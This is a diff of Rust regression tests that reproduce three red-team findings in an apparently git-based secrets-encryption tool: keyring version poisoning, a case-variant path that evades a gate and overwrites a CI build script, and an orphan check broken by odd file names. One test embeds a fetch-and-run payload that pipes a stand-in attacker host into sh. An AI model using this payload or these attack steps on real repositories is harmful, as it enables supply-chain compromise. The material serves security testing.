@@ -693,3 +693,135 @@ fn fix_reveal_still_works_for_gitignored_plaintexts() {
     )
     .expect("unhide of a gitignored tracked plaintext must work");
 }
+
+// ---------------------------------------------------------------------------
+// REPROS — red-team pass 2 (issues #21, #22, #23)
+//
+// These tests DOCUMENT the three confirmed findings; the assertions assert
+// the BAD outcome. Each is inverted by the matching fix commit.
+// ---------------------------------------------------------------------------
+
+/// Issue #22 — an unsigned zero-entry keyring carrying version:u64::MAX
+/// advances the freshness baseline on every machine that touches it; the
+/// owner then restores the real ring and EVERY gated command refuses with
+/// exit 14 forever (survives the revert).
+#[test]
+fn repro_baseline_poisoning_via_unsigned_empty_keyring() {
+    let f = Fixture::new("poison-baseline");
+    let _carol = f.add_collab("carol@example.com");
+    f.add_file("secrets.env", b"TOKEN=x\n");
+    f.hide();
+    f.stage_all();
+    let keyring_path = f.repo.join(".git-veil/keyring");
+    let real_ring = fs::read_to_string(&keyring_path).unwrap();
+
+    // ATTACK: unsigned, zero-entry ring with a poisoned version line.
+    fs::write(
+        &keyring_path,
+        format!(
+            "{}\nversion:18446744073709551615\n{}\n",
+            git_veil::BEGIN_MARKER,
+            git_veil::END_MARKER
+        ),
+    )
+    .unwrap();
+    cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path).expect("unsigned ring accepted");
+
+    // Owner restores the real ring...
+    fs::write(&keyring_path, &real_ring).unwrap();
+    // BAD OUTCOME: ...and is bricked (exit 14) because the baseline was
+    // advanced to u64::MAX by the unsigned ring.
+    let err = cmd_verify_keyring(&f.repo.path, "origin", &f.key_store.path)
+        .expect_err("ATTACK SUCCEEDS: baseline poisoned by the unsigned ring");
+    assert_eq!(exit_code_of(&err), 14);
+}
+
+/// Issue #21 — a case-variant path spelling evades the exit-43 gate on
+/// case-insensitive filesystems (macOS default); the reveal then overwrites
+/// the tracked source file. Platform-dependent: the clobber assertion runs
+/// only where the filesystem is case-insensitive.
+#[test]
+fn repro_case_variant_evades_tracked_plaintext_gate() {
+    let f = Fixture::new("case-variant");
+    let victim = generate_identity();
+    fs::write(f.repo.join("victim.recipient"), recipient_from_identity(&victim)).unwrap();
+    cmd_tell(
+        &f.repo.path,
+        "victim@example.com",
+        "victim.recipient",
+        "origin",
+        &f.key_store.path,
+        None,
+    )
+    .expect("tell victim");
+    fs::write(
+        f.repo.join("victim.age"),
+        format!("{}\n", victim.to_string().expose_secret()),
+    )
+    .unwrap();
+    cmd_import(&f.repo.path, &["victim.age".to_string()], &f.key_store.path).expect("import");
+
+    // Attacker commits tracked source file Build.sh + manifest entry spelled
+    // BUILD.SH + payload ciphertext BUILD.SH.secret.
+    fs::create_dir_all(f.repo.join("ci")).unwrap();
+    let legitimate = "#!/bin/sh\necho legitimate\n";
+    fs::write(f.repo.join("ci/Build.sh"), legitimate).unwrap();
+    fs::write(
+        f.repo.join(".git-veil/tracked.json"),
+        "{\n  \"files\": [\n    \"ci/BUILD.SH\"\n  ]\n}",
+    )
+    .unwrap();
+    let ring = git_veil::Keyring::parse(&fs::read_to_string(f.repo.join(".git-veil/keyring")).unwrap()).unwrap();
+    let recipients: Vec<_> = ring
+        .entries
+        .iter()
+        .map(|e| git_veil::parse_recipient(&e.recipient).unwrap())
+        .collect();
+    let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
+    fs::write(
+        f.repo.join("ci/BUILD.SH.secret"),
+        git_veil::encrypt_to_recipients(payload, &recipients).unwrap(),
+    )
+    .unwrap();
+    f.stage_all();
+
+    // The gate passes (that is the flaw): reveal does not refuse.
+    let result = cmd_reveal(&f.repo.path, "victim@example.com", "origin", &f.key_store.path);
+    assert!(result.is_ok(), "BAD: exit-43 gate evaded by case-variant spelling");
+
+    // On a case-insensitive filesystem the evasion is a clobber.
+    if !f.repo.join("ci/Build.sh").exists() {
+        // case-sensitive FS: BUILD.SH is a distinct new file — no clobber
+        return;
+    }
+    assert_eq!(
+        fs::read_to_string(f.repo.join("ci/Build.sh")).unwrap(),
+        String::from_utf8_lossy(payload),
+        "ATTACK SUCCEEDS: tracked source file overwritten via case-variant spelling"
+    );
+}
+
+/// Issue #23 — the orphan gate bricks hide on honest unicode names
+/// (core.quotePath quoting) and on an attacker-committed file literally
+/// named `.secret`.
+#[test]
+fn repro_orphan_gate_bricked_by_quoting_and_dot_secret() {
+    let f = Fixture::new("orphan-brick");
+    let _carol = f.add_collab("carol@example.com");
+
+    // (a) Honest unicode + space name, committed the normal way.
+    let unicode_name = "süb dir/café-sércret.env";
+    f.add_file(unicode_name, b"VALUE=1\n");
+    f.hide();
+    f.stage_all();
+
+    // (b) Attacker-committed junk file named exactly `.secret`.
+    fs::write(f.repo.join(".secret"), b"junk\n").unwrap();
+    f.stage_all();
+
+    // BAD OUTCOME: hide refuses (exit 42) although every committed
+    // ciphertext corresponds to a tracked path or is un-mappable junk.
+    let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, true)
+        .expect_err("ATTACK SUCCEEDS: orphan gate false-positives brick hide");
+    assert_eq!(exit_code_of(&err), 42);
+}
